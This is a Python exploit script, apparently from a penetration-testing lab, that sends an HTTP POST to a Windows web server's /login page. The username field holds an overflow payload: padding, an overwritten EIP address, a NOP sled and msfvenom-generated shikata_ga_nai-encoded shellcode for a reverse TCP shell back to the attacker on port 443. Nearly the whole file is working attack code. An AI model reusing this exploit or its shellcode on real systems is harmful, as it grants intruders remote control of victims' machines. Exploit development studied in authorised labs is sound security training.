#!/usr/bin/python3

import socket
import time
import sys

## msfvenom -p windows/shell/reverse_tcp -b "\x00\x0a\x0d\x25\x26\x3d" LHOST=tun0 LPORT=443 EXITFUNC=thread -f py
# msfvenom -p windows/shell_reverse_tcp -b "\x00\x0a\x0d\x25\x26\x3d" LHOST=tun0 LPORT=443 EXITFUNC=thread -e shikata_ga_nai -f py -v shell
shell =  b""
shell += b"\xdb\xc2\xba\xb4\x6f\x1d\xbb\xd9\x74\x24\xf4\x5e"
shell += b"\x33\xc9\xb1\x52\x31\x56\x17\x03\x56\x17\x83\x72"
shell += b"\x6b\xff\x4e\x86\x9c\x7d\xb0\x76\x5d\xe2\x38\x93"
shell += b"\x6c\x22\x5e\xd0\xdf\x92\x14\xb4\xd3\x59\x78\x2c"
shell += b"\x67\x2f\x55\x43\xc0\x9a\x83\x6a\xd1\xb7\xf0\xed"
shell += b"\x51\xca\x24\xcd\x68\x05\x39\x0c\xac\x78\xb0\x5c"
shell += b"\x65\xf6\x67\x70\x02\x42\xb4\xfb\x58\x42\xbc\x18"
shell += b"\x28\x65\xed\x8f\x22\x3c\x2d\x2e\xe6\x34\x64\x28"
shell += b"\xeb\x71\x3e\xc3\xdf\x0e\xc1\x05\x2e\xee\x6e\x68"
shell += b"\x9e\x1d\x6e\xad\x19\xfe\x05\xc7\x59\x83\x1d\x1c"
shell += b"\x23\x5f\xab\x86\x83\x14\x0b\x62\x35\xf8\xca\xe1"
shell += b"\x39\xb5\x99\xad\x5d\x48\x4d\xc6\x5a\xc1\x70\x08"
shell += b"\xeb\x91\x56\x8c\xb7\x42\xf6\x95\x1d\x24\x07\xc5"
shell += b"\xfd\x99\xad\x8e\x10\xcd\xdf\xcd\x7c\x22\xd2\xed"
shell += b"\x7c\x2c\x65\x9e\x4e\xf3\xdd\x08\xe3\x7c\xf8\xcf"
shell += b"\x04\x57\xbc\x5f\xfb\x58\xbd\x76\x38\x0c\xed\xe0"
shell += b"\xe9\x2d\x66\xf0\x16\xf8\x29\xa0\xb8\x53\x8a\x10"
shell += b"\x79\x04\x62\x7a\x76\x7b\x92\x85\x5c\x14\x39\x7c"
shell += b"\x37\xdb\x16\x09\x14\xb3\x64\xf5\x9b\xff\xe0\x13"
shell += b"\xf1\xef\xa4\x8c\x6e\x89\xec\x46\x0e\x56\x3b\x23"
shell += b"\x10\xdc\xc8\xd4\xdf\x15\xa4\xc6\x88\xd5\xf3\xb4"
shell += b"\x1f\xe9\x29\xd0\xfc\x78\xb6\x20\x8a\x60\x61\x77"
shell += b"\xdb\x57\x78\x1d\xf1\xce\xd2\x03\x08\x96\x1d\x87"
shell += b"\xd7\x6b\xa3\x06\x95\xd0\x87\x18\x63\xd8\x83\x4c"
shell += b"\x3b\x8f\x5d\x3a\xfd\x79\x2c\x94\x57\xd5\xe6\x70"
shell += b"\x21\x15\x39\x06\x2e\x70\xcf\xe6\x9f\x2d\x96\x19"
shell += b"\x2f\xba\x1e\x62\x4d\x5a\xe0\xb9\xd5\x7a\x03\x6b"
shell += b"\x20\x13\x9a\xfe\x89\x7e\x1d\xd5\xce\x86\x9e\xdf"
shell += b"\xae\x7c\xbe\xaa\xab\x39\x78\x47\xc6\x52\xed\x67"
shell += b"\x75\x52\x24"

padSize = 780
bufSize = 1500
rhost = "192.168.211.10"
rport = 80

print ( "\nCreating input" )
padding = b"A" * padSize
#eip = b"B" * 4 
eip = b"\x83\x0c\x09\x10"
offset = b"\x83\x0c\x09\x10"
nopsled = b"\x90" * (bufSize - padSize - len(eip) - len(offset) - len(shell))

payload = padding + eip + offset + nopsled + shell
#payload = padding + eip + offset + shell
content = b"username=" + payload + b"&password=ZzZ"

header  = b"POST /login HTTP/1.1\r\n"
header += b"Host: " + str.encode(rhost) + b"\r\n"
header += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
header += b"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
header += b"Accept-Language: en-US,en;q=0.5\r\n"
header += b"Referer: http://" + str.encode(rhost) + b"/login\r\n"
header += b"Connection: close\r\n"
header += b"Content-Type: application/x-www-form-urlencoded\r\n"
header += b"Content-Length: " + str.encode(str( len( content ) ) ) + b"\r\n"
header += b"\r\n"

print ( "\nPadding: " + str(len(padding)) + " EIP: " + str(eip) + " // " + str(len(eip)) + " Offset: " + "NM" + " // " + "0" )
print ( "\nNOP Sled: " + str(len(nopsled)) + " Shell: " + str(len(shell)) + " Payload Total: " + str( len(padding) + len(eip) + len(nopsled) + len(shell) ) + " bytes")
print ( b"\nHeader: " + str.encode(str(len(header))) + b"\n" + header )
print ( "\nTransfer Total: " + str( len(header) ) + " header + " + str( len(content) ) + " content bytes" )

sendBuffer = header + content
print ( "\nCreating buffer of %s length" % str(len(sendBuffer) ) )

try:
    print ( "\nCreating socket" )
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print ( "\nConnecting socket" )
    s.connect((rhost,rport))
    print ( "\nSending buffer with %s bytes" % len(sendBuffer) )
    s.send( sendBuffer )
    print ( "\nClosing socket" )
    s.close()
except:
    print ( "Error while manipulating socket" )
    sys.exit()
